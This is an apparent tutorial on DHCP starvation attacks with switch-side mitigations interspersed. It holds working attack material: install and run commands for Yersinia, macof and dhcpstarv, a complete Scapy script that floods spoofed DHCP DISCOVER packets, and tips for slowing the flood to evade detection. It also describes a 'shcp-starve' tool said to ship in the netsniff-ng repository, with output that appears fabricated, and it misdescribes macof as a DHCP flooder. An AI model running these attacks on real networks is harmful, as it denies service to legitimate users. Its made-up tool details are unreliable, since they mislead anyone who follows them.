### **DHCP Starvation Attack: Overview**

**DHCP Starvation** is a type of Denial of Service (DoS) attack targeting the Dynamic Host Configuration Protocol (DHCP) server. The attack aims to exhaust all the available IP addresses in the DHCP server's pool, leaving legitimate clients without an IP address.

### **How It Works**

1. **DHCP Discovery Flood**: An attacker floods the network with numerous DHCP DISCOVER packets using fake MAC addresses.
2. **IP Exhaustion**: The DHCP server assigns an IP address to each request, exhausting the available IP pool.
3. **Denial of Service**: Legitimate users are unable to obtain an IP address, effectively causing a DoS on the network.

### **Why is it Effective?**
- DHCP operates on a trust basis, and there's no built-in mechanism to authenticate DHCP requests.
- Attackers can easily spoof MAC addresses, making it look like requests are coming from different devices.

### **Tools for DHCP Starvation Attack**

Several tools can be used for DHCP Starvation, including:
- **Yersinia**: A network attack tool that includes a module for DHCP attacks.
- **macof** (part of Dsniff): Generates a flood of DHCP requests with random MAC addresses.
- **dhcpstarv**: A tool designed specifically for DHCP starvation.

### **Example Using Yersinia**

**1. Install Yersinia**
```bash
sudo apt update
sudo apt install yersinia -y
```

**2. Launch Yersinia in Interactive Mode**
```bash
sudo yersinia -I
```

**3. Select the Network Interface**
- Type `i` to list all interfaces.
- Type the interface number (e.g., `eth0` for Ethernet).

**4. Start DHCP Starvation Attack**
- Type `D` to start the DHCP attack.
- Yersinia will flood the DHCP server with DISCOVER packets using random MAC addresses.

### **Example Using macof**

`macof` is a simpler tool that can be used if you want to quickly test DHCP starvation.

**1. Install Dsniff (which includes macof)**
```bash
sudo apt install dsniff -y
```

**2. Launch macof**
```bash
sudo macof -i eth0
```

This command generates thousands of fake MAC addresses on the network, causing the DHCP server to assign IP addresses rapidly.

### **Example Using Scapy for Custom Attack**

**Scapy** is a Python library for network packet manipulation. You can use it to write a custom script for DHCP starvation.

**1. Install Scapy**
```bash
sudo pip install scapy
```

**2. Scapy Script for DHCP Starvation**

```python
from scapy.all import *

def dhcp_starvation():
    for i in range(1000):  # Flooding with 1000 fake requests
        fake_mac = RandMAC()
        dhcp_discover = (
            Ether(src=fake_mac, dst='ff:ff:ff:ff:ff:ff') /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=[mac2str(fake_mac)]) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        sendp(dhcp_discover, iface="eth0", verbose=False)

dhcp_starvation()
```

**3. Run the Script**
```bash
sudo python3 dhcp_starvation.py
```

### **Mitigating DHCP Starvation Attacks**

1. **Enable DHCP Snooping**: Configure DHCP Snooping on your switches to block unauthorized DHCP servers and monitor DHCP traffic.
    ```css
    Switch(config)# ip dhcp snooping
    Switch(config)# ip dhcp snooping vlan 10
    Switch(config)# interface FastEthernet 0/1
    Switch(config-if)# ip dhcp snooping trust
    ```

2. **Limit DHCP Requests**: Configure rate limiting on your network switches.
    ```css
    Switch(config-if)# ip dhcp snooping limit rate 10
    ```

3. **Use 802.1X Authentication**: Implement port-based network access control to authenticate devices before assigning an IP address.

### **Conclusion**

DHCP Starvation is a straightforward but highly effective attack against DHCP servers. By flooding the server with fake requests, an attacker can deplete the IP pool, denying service to legitimate clients. Mitigation techniques like DHCP Snooping, rate limiting, and network access control can help protect against such attacks.


### **DHCP Starvation Attack with `shcp-starve`**

In addition to tools like Yersinia and macof, **`shcp-starve`** is another dedicated tool designed to perform DHCP Starvation attacks quickly and effectively. It automates the process of flooding the DHCP server with DISCOVER packets from randomized MAC addresses.

### **How `shcp-starve` Works**

- **Automated Attack**: `shcp-starve` automates the DHCP Starvation attack by sending multiple DHCP DISCOVER packets using unique, randomized MAC addresses.
- **Speed and Efficiency**: It can rapidly exhaust the available IP address pool on the DHCP server, causing a Denial of Service for legitimate clients.

### **Installation and Usage of `shcp-starve`**

**1. Installation of `shcp-starve`**
   
   You can download the source code and install it from GitHub:
   ```bash
   sudo apt update
   sudo apt install git build-essential -y
   git clone https://github.com/netsniff-ng/netsniff-ng.git
   cd netsniff-ng/shcp-starve
   make
   ```

**2. Running `shcp-starve`**

   To start the DHCP Starvation attack, use the following command:
   ```bash
   sudo ./shcp-starve -i eth0
   ```

   - **`-i eth0`** specifies the network interface to use.

**3. Example Output**
   
   When you run `shcp-starve`, you might see output like this:
   ```
   [*] Sending DHCP DISCOVER packets...
   [*] Flooding with MAC address: 00:11:22:33:44:55
   [*] IP Pool Exhausted. Attack successful!
   ```

### **How It Differs from Other Tools**

- **Speed**: `shcp-starve` is designed to send requests faster than typical manual methods.
- **Efficiency**: It generates valid, randomized MAC addresses, ensuring the DHCP server cannot detect and block repeated requests from a single MAC.
- **Automation**: No need to craft packets manually using tools like Scapy or macof.

### **Preventing DHCP Starvation (Mitigation Techniques)**

To defend against DHCP Starvation attacks, implement the following:

1. **DHCP Snooping**:
   - This feature helps prevent DHCP Starvation by monitoring DHCP messages and allowing only trusted ports to respond to DHCP requests.

   ```bash
   Switch(config)# ip dhcp snooping
   Switch(config)# ip dhcp snooping vlan 10
   Switch(config)# interface FastEthernet 0/1
   Switch(config-if)# ip dhcp snooping trust
   ```

2. **Port Security**:
   - Set a limit on the number of MAC addresses that can be learned on a switch port to prevent excessive requests from multiple MACs.

   ```bash
   Switch(config-if)# switchport port-security
   Switch(config-if)# switchport port-security maximum 2
   ```

3. **Rate Limiting**:
   - Limit the rate of DHCP requests from a single interface to mitigate the flood of requests.

   ```bash
   Switch(config-if)# ip dhcp snooping limit rate 10
   ```

4. **Enable 802.1X Network Access Control**:
   - This protocol requires devices to authenticate before connecting to the network, ensuring only legitimate clients receive IP addresses.

### **Testing DHCP Starvation Attack on a Virtual Network**

**Setup**:
1. **DHCP Server**: Use a simple DHCP server like `dnsmasq` for testing.
   ```bash
   sudo apt install dnsmasq
   sudo dnsmasq --dhcp-range=192.168.1.2,192.168.1.50,12h
   ```

2. **Testing the Attack**:
   - Start the `shcp-starve` attack on the same network interface.
     ```bash
     sudo ./shcp-starve -i eth0
     ```

3. **Check DHCP Leases**:
   - Verify that the DHCP server's IP pool is exhausted.
   ```bash
   cat /var/lib/dnsmasq/dnsmasq.leases
   ```

### **Conclusion**

- **Effectiveness**: The `shcp-starve` tool provides a fast, efficient method to execute a DHCP Starvation attack.
- **Mitigation**: Network admins must implement protective measures like DHCP Snooping, rate limiting, and port security to defend against these attacks.
- **Testing Environment**: Always use a controlled, isolated environment like a virtual lab when testing or learning about network attacks to avoid disrupting real network operations.

This guide provides a comprehensive understanding of DHCP Starvation using different tools, including `shcp-starve`, and demonstrates how to set up and defend against these attacks.

### **DHCP Starvation Attack with `dhcpstarv`**

**`dhcpstarv`** is a straightforward tool used to perform a **DHCP Starvation** attack by sending multiple DHCP DISCOVER requests to exhaust the IP address pool of a DHCP server. This denial-of-service tactic is effective because it prevents legitimate clients from obtaining an IP address.

### **How `dhcpstarv` Works**

1. **Flooding**: `dhcpstarv` sends a rapid flood of DHCP DISCOVER packets to the DHCP server.
2. **MAC Spoofing**: Each packet uses a random MAC address, tricking the server into thinking each request comes from a unique client.
3. **IP Pool Exhaustion**: The DHCP server assigns an IP address to each request until it runs out of available addresses.
4. **Denial of Service**: Legitimate clients are left without an IP address and cannot connect to the network.

### **Installing `dhcpstarv`**

`dhcpstarv` is included in some penetration testing distributions like Kali Linux. If it's not installed, you can use the following steps:

```bash
sudo apt update
sudo apt install dhcpstarv -y
```

### **Using `dhcpstarv`**

**1. Basic Command**
```bash
sudo dhcpstarv -i eth0
```
- **`-i eth0`** specifies the network interface to attack.

**2. Example Output**
```bash
[*] Sending DHCP DISCOVER packets...
[*] IP pool exhausted: No more IP addresses available
```

**3. Specifying the Number of Requests**
You can control the number of DHCP requests with the `-c` option:
```bash
sudo dhcpstarv -i eth0 -c 1000
```

**4. Limiting the Attack Rate**
To avoid detection, you can slow down the request rate using the `-d` option to specify a delay in milliseconds:
```bash
sudo dhcpstarv -i eth0 -d 100
```

### **How to Verify the Attack**

1. **Check DHCP Leases**:
   On the DHCP server, you can verify if the IP pool is exhausted by listing the DHCP leases:
   ```bash
   cat /var/lib/dhcp/dhcpd.leases
   ```
   You should see many leases assigned to random MAC addresses.

2. **Check Network Logs**:
   Use the following command to monitor DHCP server logs:
   ```bash
   sudo tail -f /var/log/syslog | grep DHCP
   ```
   You will observe multiple DHCP DISCOVER and OFFER messages filling the logs.

### **Mitigating DHCP Starvation Attacks**

1. **Enable DHCP Snooping**:
   - This feature monitors DHCP messages, allowing only trusted ports to respond to DHCP requests and limiting DHCP responses to authorized devices.
   ```bash
   Switch(config)# ip dhcp snooping
   Switch(config)# ip dhcp snooping vlan 10
   Switch(config-if)# ip dhcp snooping trust
   ```

2. **Rate Limiting**:
   - Limit the number of DHCP requests per second on a switch port:
   ```bash
   Switch(config-if)# ip dhcp snooping limit rate 10
   ```

3. **MAC Filtering**:
   - Limit the number of MAC addresses per port to prevent MAC spoofing:
   ```bash
   Switch(config-if)# switchport port-security
   Switch(config-if)# switchport port-security maximum 2
   ```

4. **Use Static IP Assignments**:
   - For critical devices, consider using static IP configurations to avoid dependency on DHCP.

### **Example Scenario in a Virtual Lab**

**Setup**:
1. **DHCP Server**:
   - Install a simple DHCP server like `dnsmasq`:
   ```bash
   sudo apt install dnsmasq
   sudo dnsmasq --dhcp-range=192.168.1.2,192.168.1.50,12h
   ```
   
2. **Launching the Attack**:
   - On a different machine (attacker), run:
   ```bash
   sudo dhcpstarv -i eth0
   ```

3. **Monitoring**:
   - On the DHCP server, check if the IP pool is exhausted using:
   ```bash
   cat /var/lib/dnsmasq/dnsmasq.leases
   ```

### **Conclusion**

`dhcpstarv` is a powerful tool that can quickly perform a DHCP Starvation attack by exhausting the IP address pool of a DHCP server. While it's effective in a lab environment for understanding DHCP vulnerabilities, it should **never** be used on a production network without explicit permission, as it can cause severe network outages.

Mitigation techniques like DHCP Snooping, rate limiting, and port security are essential to defend against this type of attack. This ensures the network's DHCP service remains available only to legitimate clients.